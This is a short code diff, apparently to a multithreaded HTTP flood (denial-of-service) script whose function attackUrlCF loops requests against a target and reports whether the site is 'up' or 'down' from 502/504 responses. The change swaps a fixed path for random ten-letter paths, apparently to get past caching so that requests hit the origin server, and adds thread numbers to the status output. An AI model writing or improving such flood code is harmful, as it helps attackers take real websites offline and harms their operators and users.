@@ -87,7 +87,7 @@ def attackUrlCF(baseUrl, threadNumber):
 
 	while True:
 		try:
-			url = baseUrl + '/crypto-news'
+			url = baseUrl + '/' + ''.join(random.choice(letters) for i in range(10)) 
 
 			headers={'User-Agent': userAgent,
 			'Accept-Language': 'en-US,en;q=0.9',
@@ -109,7 +109,7 @@ def attackUrlCF(baseUrl, threadNumber):
 				if str(r.status_code) in ['502', '504']:					
 					isClear = False
 			if isClear:
-				print('up.....')
+				print('threadNum: ' + str(threadNumber), 'up.....')
 			else:
 				print('down!!!!!')
 			# print('threadNum: ' + str(threadNumber))
